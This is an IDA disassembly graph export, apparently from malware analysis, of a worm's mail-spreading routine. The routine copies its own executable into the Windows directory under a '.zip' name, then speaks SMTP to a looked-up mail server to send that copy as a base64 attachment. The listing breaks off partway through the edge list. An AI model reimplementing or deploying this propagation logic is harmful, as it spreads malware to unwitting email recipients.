@@ -1,0 +1,1140 @@
+graph: {
+title: "Graph of sub_401D65"
+manhattan_edges: yes
+layoutalgorithm: mindepth
+finetuning: no
+layout_downfactor: 100
+layout_upfactor: 0
+layout_nearfactor: 0
+xlspace: 12
+yspace: 30
+// IDA palette
+colorentry 32: 0 0 0
+colorentry 33: 0 0 255
+colorentry 34: 0 0 255
+colorentry 35: 128 128 128
+colorentry 36: 128 128 128
+colorentry 37: 0 0 128
+colorentry 38: 0 0 128
+colorentry 39: 0 0 255
+colorentry 40: 0 0 255
+colorentry 41: 0 0 128
+colorentry 42: 0 128 0
+colorentry 43: 0 255 0
+colorentry 44: 0 128 0
+colorentry 45: 255 128 0
+colorentry 46: 0 128 0
+colorentry 47: 128 128 255
+colorentry 48: 255 0 0
+colorentry 49: 128 128 0
+colorentry 50: 1 1 1
+colorentry 51: 192 192 192
+colorentry 52: 0 0 255
+colorentry 53: 0 0 255
+colorentry 54: 0 0 255
+colorentry 55: 128 128 128
+colorentry 56: 128 128 255
+colorentry 57: 0 128 0
+colorentry 58: 0 0 128
+colorentry 59: 0 0 255
+colorentry 60: 128 0 128
+colorentry 61: 0 128 0
+colorentry 62: 0 128 0
+colorentry 63: 0 128 64
+colorentry 64: 0 0 128
+colorentry 65: 0 0 128
+colorentry 66: 255 0 255
+colorentry 67: 128 128 0
+colorentry 68: 0 0 128
+colorentry 69: 0 0 255
+colorentry 70: 0 0 128
+colorentry 71: 0 0 255
+colorentry 72: 0 0 0
+colorentry 73: 255 255 255
+colorentry 74: 192 192 192
+colorentry 75: 0 255 255
+colorentry 76: 0 0 0
+colorentry 77: 128 0 0
+colorentry 78: 128 128 128
+colorentry 79: 128 128 0
+colorentry 80: 255 0 255
+colorentry 81: 0 0 0
+colorentry 82: 0 0 255
+colorentry 83: 0 0 0
+node: { title: "0" label: "58sub_401D6531:
+push    ebp
+mov     ebp, esp
+mov     eax, 13ECh
+call    __alloca_probe
+push    ebx
+push    esi
+push    edi
+call    sub_401CB7
+push    19h
+cdq
+pop     ecx
+idiv    ecx
+cmp     edx, 0Bh
+mov     esi, off_40718C[edx*4]
+mov     [ebp+var_10], esi
+jle     loc_401EB1" vertical_order: 0 }
+node: { title: "1" label: "7600401D9331:
+mov     ebx, 400h
+lea     eax, [ebp+hObject]
+push    ebx             ; uSize
+push    eax             ; lpBuffer
+mov     [ebp+var_C], 1
+call    GetWindowsDirectoryA
+lea     eax, [ebp+hObject]
+push    eax             ; Str
+call    _strlen
+cmp     [ebp+eax+var_7ED], 5Ch
+pop     ecx
+jz      short loc_401DD7" }
+node: { title: "2" label: "7600401DC431:
+lea     eax, [ebp+hObject]
+push    offset Source   ; \"\\\\\"
+push    eax             ; Dest
+call    _strcat
+pop     ecx
+pop     ecx" }
+node: { title: "3" label: "58loc_401DD731:
+lea     eax, [ebp+var_FEC]
+push    esi             ; Source
+push    eax             ; Dest
+call    _strcpy
+push    esi             ; Str
+xor     edi, edi
+call    _strlen
+add     esp, 0Ch
+test    eax, eax
+jbe     short loc_401E1B" }
+node: { title: "4" label: "58loc_401DF331:
+cmp     byte ptr [edi+esi], 2Eh
+lea     eax, [edi+esi]
+jnz     short loc_401E0F" }
+node: { title: "5" label: "7600401DFC31:
+and     byte ptr [eax], 0
+push    offset a_zip    ; \".zip\"
+push    esi             ; Dest
+call    _strcat
+pop     ecx
+pop     ecx
+push    32h
+pop     edi" }
+node: { title: "6" label: "58loc_401E0F31:
+push    esi             ; Str
+inc     edi
+call    _strlen
+cmp     edi, eax
+pop     ecx
+jb      short loc_401DF3" }
+node: { title: "7" label: "58loc_401E1B31:
+lea     eax, [ebp+hObject]
+push    esi             ; Source
+push    eax             ; Dest
+call    _strcat
+pop     ecx
+lea     eax, [ebp+NumberOfBytesWritten]
+pop     ecx
+push    ebx             ; nSize
+push    eax             ; lpFilename
+push    0               ; hModule
+call    GetModuleFileNameA
+lea     eax, [ebp+var_FEC]
+push    eax             ; lpNumberOfBytesWritten
+lea     eax, [ebp+hObject]
+push    eax             ; hObject
+lea     eax, [ebp+NumberOfBytesWritten]
+push    eax             ; NumberOfBytesWritten
+call    sub_40170B
+add     esp, 0Ch" }
+node: { title: "8" label: "58loc_401E5731:
+mov     eax, off_407178
+mov     [ebp+var_18], eax
+call    sub_401CB7
+push    6
+mov     ebx, [ebp+hFile]
+cdq
+pop     ecx
+mov     esi, lstrlen
+idiv    ecx
+and     [ebp+Source], 0
+push    ebx
+mov     byte_407CA4, 22h
+xor     edi, edi
+mov     eax, edx
+shl     eax, 2
+mov     ecx, off_407160[eax]
+mov     eax, off_407148[eax]
+mov     [ebp+var_1C], ecx
+mov     [ebp+var_14], eax
+call    esi ; lstrlen
+test    eax, eax
+jle     short loc_401EC9" }
+node: { title: "9" label: "58loc_401EA131:
+cmp     byte ptr [edi+ebx], 40h
+jz      short loc_401EB7" }
+node: { title: "10" label: "7600401EA731:
+push    ebx
+inc     edi
+call    esi ; lstrlen
+cmp     edi, eax
+jl      short loc_401EA1" }
+node: { title: "11" label: "7600401EAF31:
+jmp     short loc_401EC9" }
+node: { title: "12" label: "58loc_401EB131:
+and     [ebp+var_C], 0
+jmp     short loc_401E57" }
+node: { title: "13" label: "58loc_401EB731:
+lea     eax, [edi+ebx+1]
+push    eax
+lea     eax, [ebp+Source]
+push    eax
+call    lstrcpy" }
+node: { title: "14" label: "58loc_401EC931:
+cmp     [ebp+Source], 0
+jz      loc_402836" }
+node: { title: "15" label: "7600401ED631:
+mov     esi, GlobalAlloc
+mov     edi, 248h
+push    edi             ; dwBytes
+push    40h             ; uFlags
+call    esi ; GlobalAlloc
+mov     ebx, eax
+lea     eax, [ebp+pOutBufLen]
+push    eax             ; pOutBufLen
+push    ebx             ; pFixedInfo
+mov     [ebp+pOutBufLen], edi
+call    j_GetNetworkParams
+mov     edi, GlobalFree
+cmp     eax, 6Fh
+jnz     short loc_401F0C" }
+node: { title: "16" label: "7600401F0031:
+push    ebx             ; hMem
+call    edi ; GlobalFree
+push    [ebp+pOutBufLen]; dwBytes
+push    40h             ; uFlags
+call    esi ; GlobalAlloc
+mov     ebx, eax" }
+node: { title: "17" label: "58loc_401F0C31:
+lea     eax, [ebp+pOutBufLen]
+push    eax             ; pOutBufLen
+push    ebx             ; pFixedInfo
+call    j_GetNetworkParams
+test    eax, eax
+jnz     short loc_401F2D" }
+node: { title: "18" label: "7600401F1A31:
+lea     eax, [ebx+110h]
+push    eax             ; Source
+push    offset Dest     ; Dest
+call    _strcpy
+pop     ecx
+pop     ecx" }
+node: { title: "19" label: "58loc_401F2D31:
+test    ebx, ebx
+jz      short loc_401F34" }
+node: { title: "20" label: "7600401F3131:
+push    ebx             ; hMem
+call    edi ; GlobalFree" }
+node: { title: "21" label: "58loc_401F3431:
+lea     eax, [ebp+Source]
+push    eax
+call    sub_401569
+mov     esi, eax
+pop     ecx
+test    esi, esi
+jz      loc_402836" }
+node: { title: "22" label: "7600401F4B31:
+lea     eax, [esi+4]
+push    eax
+lea     eax, [ebp+name]
+push    eax
+call    lstrcpy
+push    esi             ; Memory
+call    ??3@YAXPAX@Z    ; operator delete(void *)
+pop     ecx
+lea     eax, [ebp+name]
+push    eax             ; name
+call    gethostbyname
+mov     esi, eax
+test    esi, esi
+jz      loc_402836" }
+node: { title: "23" label: "7600401F7A31:
+push    10h             ; Size
+lea     eax, [ebp+Dst]
+push    0               ; Val
+push    eax             ; Dst
+call    _memset
+mov     eax, [esi+0Ch]
+push    4               ; Size
+push    dword ptr [eax] ; Src
+lea     eax, [ebp+var_128]
+push    eax             ; Dst
+call    _memcpy
+add     esp, 18h
+mov     [ebp+Dst], 2
+push    19h             ; hostshort
+call    off_406144
+push    6               ; protocol
+push    1
+pop     esi
+mov     [ebp+var_12A], ax
+push    esi             ; type
+push    2               ; af
+call    socket
+mov     edi, eax
+lea     eax, [ebp+Dst]
+push    10h             ; namelen
+push    eax             ; name
+push    edi             ; s
+call    connect
+cmp     eax, 0FFFFFFFFh
+jnz     short loc_401FE1" }
+node: { title: "24" label: "7600401FDD31:
+xor     esi, esi
+jmp     short loc_402012" }
+node: { title: "25" label: "58loc_401FE131:
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    recv
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jnz     short loc_402020" }
+node: { title: "26" label: "760040200931:
+push    2               ; how
+push    edi             ; s
+call    shutdown" }
+node: { title: "27" label: "58loc_40201231:
+push    edi             ; s
+call    closesocket
+mov     eax, esi
+jmp     loc_402838" }
+node: { title: "28" label: "58loc_40202031:
+lea     eax, [ebp+buf]
+push    offset aHelo    ; \"HELO \"
+push    eax             ; Dest
+call    _strcpy
+lea     eax, [ebp+Source]
+push    eax             ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+mov     ebx, offset buf ; \"\\r\\n\"
+lea     eax, [ebp+buf]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+mov     esi, send
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jz      loc_402821" }
+node: { title: "29" label: "760040209031:
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    recv
+mov     [ebp+var_4], eax
+lea     eax, [ebp+buf]
+push    1               ; Count
+push    eax             ; Source
+push    offset a2       ; \"2\"
+call    _strncpy
+lea     eax, [ebp+buf]
+push    eax
+push    [ebp+var_4]
+call    sub_401D51
+add     esp, 14h
+test    al, al
+jz      loc_402821" }
+node: { title: "30" label: "76004020D531:
+push    offset a2       ; \"2\"
+call    sub_40283D
+cmp     eax, 2
+pop     ecx
+jnz     loc_402821" }
+node: { title: "31" label: "76004020E931:
+lea     eax, [ebp+buf]
+push    offset aMailFrom; \"MAIL FROM: <\"
+push    eax             ; Dest
+call    _strcpy
+push    [ebp+var_14]    ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    offset asc_407C84; \">\\r\\n\"
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jz      loc_402821" }
+node: { title: "32" label: "760040214E31:
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    recv
+mov     [ebp+var_4], eax
+lea     eax, [ebp+buf]
+push    1               ; Count
+push    eax             ; Source
+push    offset a2       ; \"2\"
+call    _strncpy
+lea     eax, [ebp+buf]
+push    eax
+push    [ebp+var_4]
+call    sub_401D51
+add     esp, 14h
+test    al, al
+jz      loc_402821" }
+node: { title: "33" label: "760040219331:
+push    offset a2       ; \"2\"
+call    sub_40283D
+cmp     eax, 2
+pop     ecx
+jnz     loc_402821" }
+node: { title: "34" label: "76004021A731:
+lea     eax, [ebp+buf]
+push    offset aRcptTo  ; \"RCPT TO: <\"
+push    eax             ; Dest
+call    _strcpy
+push    [ebp+hFile]     ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    offset asc_407C84; \">\\r\\n\"
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jz      loc_402821" }
+node: { title: "35" label: "760040220C31:
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    recv
+mov     [ebp+var_4], eax
+lea     eax, [ebp+buf]
+push    1               ; Count
+push    eax             ; Source
+push    offset a2       ; \"2\"
+call    _strncpy
+lea     eax, [ebp+buf]
+push    eax
+push    [ebp+var_4]
+call    sub_401D51
+add     esp, 14h
+test    al, al
+jz      loc_402821" }
+node: { title: "36" label: "760040225131:
+push    offset a2       ; \"2\"
+call    sub_40283D
+cmp     eax, 2
+pop     ecx
+jnz     loc_402821" }
+node: { title: "37" label: "760040226531:
+lea     eax, [ebp+buf]
+push    offset aData    ; \"DATA\\r\\n\"
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jz      loc_402821" }
+node: { title: "38" label: "76004022A931:
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    recv
+mov     [ebp+var_4], eax
+lea     eax, [ebp+buf]
+push    1               ; Count
+push    eax             ; Source
+push    offset a2       ; \"2\"
+call    _strncpy
+lea     eax, [ebp+buf]
+push    eax
+push    [ebp+var_4]
+call    sub_401D51
+add     esp, 14h
+test    al, al
+jz      loc_402821" }
+node: { title: "39" label: "76004022EE31:
+push    offset a2       ; \"2\"
+call    sub_40283D
+cmp     eax, 3
+pop     ecx
+jnz     loc_402821" }
+node: { title: "40" label: "760040230231:
+push    offset a00000000; \"00000000\"
+call    sub_401D19
+lea     eax, [ebp+buf]
+mov     [esp+13FCh+var_13FC], offset aFrom; \"From: \"
+push    eax             ; Dest
+call    _strcpy
+push    [ebp+var_1C]    ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset aTo      ; \"To: \"
+push    eax             ; Dest
+call    _strcpy
+push    [ebp+hFile]     ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset aSubject ; \"Subject: \"
+push    eax             ; Dest
+call    _strcpy
+push    [ebp+var_18]    ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset aDate    ; \"Date: \"
+push    eax             ; Dest
+call    _strcpy
+lea     eax, [ebp+var_3EC]
+push    eax
+call    sub_401AC5
+lea     eax, [ebp+var_3EC]
+push    eax             ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 1Ch
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+push    13h             ; len
+push    offset aMimeVersion1_0; \"MIME-Version: 1.0\\r\\n\"
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset aContentTypeMul; \"Content-Type: multipart/mixed; boundary\"...
+push    eax             ; Dest
+call    _strcpy
+lea     eax, [ebp+buf]
+push    offset a00000000; \"00000000\"
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    offset asc_407BFC; \"\\\"\\r\\n\"
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+push    2               ; len
+push    ebx             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+var_26C]
+push    offset asc_407BF8; \"--\"
+push    eax             ; Dest
+call    _strcpy
+lea     eax, [ebp+var_26C]
+push    offset a00000000; \"00000000\"
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+var_26C]
+push    ebx             ; Source
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+lea     eax, [ebp+var_26C]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+var_26C]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset aContentTypeTex; \"Content-Type: text/plain; charset=us-as\"...
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+push    2               ; len
+push    ebx             ; buf
+push    edi             ; s
+call    esi ; send
+push    off_40717C      ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    41h
+push    offset a00000000000000; \"0000000000000000\\n\"
+call    sub_401CDF
+lea     eax, [ebp+buf]
+push    offset a00000000000000; \"0000000000000000\\n\"
+push    eax             ; Dest
+call    _strcpy
+add     esp, 10h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    off_407180      ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    50h
+push    offset a00000000000000; \"0000000000000000\\n\"
+call    sub_401CDF
+lea     eax, [ebp+buf]
+push    offset a00000000000000; \"0000000000000000\\n\"
+push    eax             ; Dest
+call    _strcpy
+add     esp, 10h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    off_407184      ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+push    4               ; len
+push    offset asc_407B8C; \"\\r\\n\\r\\n\"
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+var_26C]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+var_26C]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+cmp     [ebp+var_C], 0
+jnz     short loc_40265C" }
+node: { title: "41" label: "760040265531:
+push    offset aContentTypeApp; \"Content-Type: application/octet-stream;\"...
+jmp     short loc_402661" }
+node: { title: "42" label: "58loc_40265C31:
+push    offset aContentTypeA_0; \"Content-Type: application/x-zip-compres\"..." }
+node: { title: "43" label: "58loc_40266131:
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    [ebp+var_10]    ; Source
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    offset aContentTransfe; \"\\\"\\r\\nContent-Transfer-Encoding: base64\\r\\nC\"...
+push    eax             ; Dest
+call    _strcat
+push    [ebp+var_10]    ; Source
+lea     eax, [ebp+buf]
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+buf]
+push    offset asc_407BFC; \"\\\"\\r\\n\"
+push    eax             ; Dest
+call    _strcat
+add     esp, 20h
+lea     eax, [ebp+buf]
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+push    2               ; len
+push    ebx             ; buf
+push    edi             ; s
+call    esi ; send
+lea     ecx, [ebp+buf]
+push    ecx
+push    eax
+call    sub_401D51
+pop     ecx
+test    al, al
+pop     ecx
+jz      loc_402821" }
+node: { title: "44" label: "76004026EB31:
+cmp     [ebp+var_C], 0
+jnz     short loc_402707" }
+node: { title: "45" label: "76004026F131:
+lea     eax, [ebp+PathName]
+push    400h            ; nSize
+push    eax             ; lpFilename
+push    0               ; hModule
+call    GetModuleFileNameA
+jmp     short loc_40271C" }
+node: { title: "46" label: "58loc_40270731:
+lea     eax, [ebp+hObject]
+push    eax             ; Source
+lea     eax, [ebp+PathName]
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+pop     ecx" }
+node: { title: "47" label: "58loc_40271C31:
+lea     eax, [ebp+PathName]
+push    0               ; iReadWrite
+push    eax             ; lpPathName
+call    _lopen
+cmp     eax, 0FFFFFFFFh
+mov     [ebp+hFile], eax
+jz      short loc_402748" }
+node: { title: "48" label: "760040273331:
+push    48h             ; int
+push    edi             ; s
+push    eax             ; hFile
+call    sub_401C10
+add     esp, 0Ch
+push    [ebp+hFile]     ; hFile
+call    _lclose" }
+node: { title: "49" label: "58loc_40274831:
+push    0               ; flags
+push    2               ; len
+push    ebx             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+var_26C]
+push    offset asc_407BF8; \"--\"
+push    eax             ; Dest
+call    _strcpy
+lea     eax, [ebp+var_26C]
+push    offset a00000000; \"00000000\"
+push    eax             ; Dest
+call    _strcat
+lea     eax, [ebp+var_26C]
+push    offset asc_407ACC; \"--\\r\\n\"
+push    eax             ; Dest
+call    _strcat
+add     esp, 18h
+xor     ebx, ebx
+lea     eax, [ebp+var_26C]
+push    ebx             ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+var_26C]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+lea     eax, [ebp+buf]
+push    offset a__0     ; \"\\r\\n.\\r\\n\"
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    ebx             ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    ebx             ; flags
+mov     ebx, recv
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    ebx ; recv
+lea     eax, [ebp+buf]
+push    offset aQuit    ; \"QUIT\\r\\n\"
+push    eax             ; Dest
+call    _strcpy
+pop     ecx
+lea     eax, [ebp+buf]
+pop     ecx
+push    0               ; flags
+push    eax             ; Str
+call    _strlen
+pop     ecx
+push    eax             ; len
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    edi             ; s
+call    esi ; send
+push    0               ; flags
+lea     eax, [ebp+buf]
+push    100h            ; len
+push    eax             ; buf
+push    edi             ; s
+call    ebx ; recv" }
+node: { title: "50" label: "58loc_40282131:
+push    2               ; how
+push    edi             ; s
+call    shutdown
+push    edi             ; s
+call    closesocket
+push    1
+pop     eax
+jmp     short loc_402838" }
+node: { title: "51" label: "58loc_40283631:
+xor     eax, eax" }
+node: { title: "52" label: "58loc_40283831:
+pop     edi
+pop     esi
+pop     ebx
+leave
+retn" vertical_order: 53 }
+// node 0
+edge: { sourcename: "0" targetname: "1" label: "false" color: red }
+edge: { sourcename: "0" targetname: "12" label: "true" color: darkgreen }
+// node 1
+edge: { sourcename: "1" targetname: "2" label: "false" color: red }
+edge: { sourcename: "1" targetname: "3" label: "true" color: darkgreen }
+// node 2
+edge: { sourcename: "2" targetname: "3" }
+// node 3
+edge: { sourcename: "3" targetname: "4" label: "false" color: red }
+edge: { sourcename: "3" targetname: "7" label: "true" color: darkgreen }
+// node 4
+edge: { sourcename: "4" targetname: "5" label: "false" color: red }
+edge: { sourcename: "4" targetname: "6" label: "true" color: darkgreen }
+// node 5
+edge: { sourcename: "5" targetname: "6" }
+// node 6
+edge: { sourcename: "6" targetname: "4" label: "true" color: darkgreen }
+edge: { sourcename: "6" targetname: "7" label: "false" color: red }
+// node 7
+edge: { sourcename: "7" targetname: "8" }
+// node 8
+edge: { sourcename: "8" targetname: "9" label: "false" color: red }
+edge: { sourcename: "8" targetname: "14" label: "true" color: darkgreen }
+// node 9
+edge: { sourcename: "9" targetname: "10" label: "false" color: red }
+edge: { sourcename: "9" targetname: "13" label: "true" color: darkgreen }
+// node 10
+edge: { sourcename: "10" targetname: "9" label: "true" color: darkgreen }
+edge: { sourcename: "10" targetname: "11" label: "false" color: red }
+// node 11
+edge: { sourcename: "11" targetname: "14" }
+// node 12
+edge: { sourcename: "12" targetname: "8" }
+// node 13
+edge: { sourcename: "13" targetname: "14" }
+// node 14
+edge: { sourcename: "14" targetname: "15" label: "false" color: red }
+edge: { sourcename: "14" targetname: "51" label: "true" color: darkgreen }
+// node 15
+edge: { sourcename: "15" targetname: "16" label: "false" color: red }
+edge: { sourcename: "15" targetname: "17" label: "true" color: darkgreen }
+// node 16
+edge: { sourcename: "16" targetname: "17" }
+// node 17
+edge: { sourcename: "17" targetname: "18" label: "false" color: red }
+edge: { sourcename: "17" targetname: "19" label: "true" color: darkgreen }
+// node 18
+edge: { sourcename: "18" targetname: "19" }
+// node 19
+edge: { sourcename: "19" targetname: "20" label: "false" color: red }
+edge: { sourcename: "19" targetname: "21" label: "true" color: darkgreen }
+// node 20
+edge: { sourcename: "20" targetname: "21" }
+// node 21
+edge: { sourcename: "21" targetname: "22" label: "false" color: red }
+edge: { sourcename: "21" targetname: "51" label: "true" color: darkgreen }
+// node 22
+edge: { sourcename: "22" targetname: "23" label: "false" color: red }
+edge: { sourcename: "22" targetname: "51" label: "true" color: darkgreen }
+// node 23
+edge: { sourcename: "23" targetname: "24" label: "false" color: red }
+edge: { sourcename: "23" targetname: "25" label: "true" color: darkgreen }
+// node 24
+edge: { sourcename: "24" targetname: "27" }
+// node 25
+edge: { sourcename: "25" targetname: "26" label: "false" color: red }
+edge: { sourcename: "25" targetname: "28" label: "true" color: darkgreen }
+// node 26
+edge: { sourcename: "26" targetname: "27" }
+// node 27
+edge: { sourcename: "27" targetname: "52" }
+// node 28
+edge: { sourcename: "28" targetname: "29" label: "false" color: red }
+edge: { sourcename: "28" targetname: "50" label: "true" color: darkgreen }
+// node 29
+edge: { sourcename: "29" targetname: "30" label: "false" color: red }
+edge: { sourcename: "29" targetname: "50" label: "true" color: darkgreen }
+// node 30
+edge: { sourcename: "30" targetname: "31" label: "false" color: red }
+edge: { sourcename: "30" targetname: "50" label: "true" color: darkgreen }
+// node 31
+edge: { sourcename: "31" targetname: "32" label: "false" color: red }
+edge: { sourcename: "31" targetname: "50" label: "true" color: darkgreen }
+// node 32
+edge: { sourcename: "32" targetname: "33" label: "false" color: red }
+edge: { sourcename: "32" targetname: "50" label: "true" color: darkgreen }
+// node 33
+edge: { sourcename: "33" targetname: "34" label: "false" color: red }
+edge: { sourcename: "33" targetname: "50" label: "true" color: darkgreen }
+// node 34
+edge: { sourcename: "34" targetname: "35" label: "false" color: red }
+edge: { sourcename: "34" targetname: "50" label: "true" color: darkgreen }
+// node 35
+edge: { sourcename: "35" targetname: "36" label: "false" color: red }
+edge: { sourcename: "35" targetname: "50" label: "true" color: darkgreen }
+// node 36
+edge: { sourcename: "36" targetname: "37" label: "false" color: red }
+edge: { sourcename: "36" targetname: "50" label: "true" color: darkgreen }
+// node 37
+edge: { sourcename: "37" targetname: "38" label: "false" color: red }
+edge: { sourcename: "37" targetname: "50" label: "true" color: darkgreen }
+// node 38
+edge: { sourcename: "38" targetname: "39" label: "false" color: red }
+edge: { sourcename: "38" targetname: "50" label: "true" color: darkgreen }
+// node 39
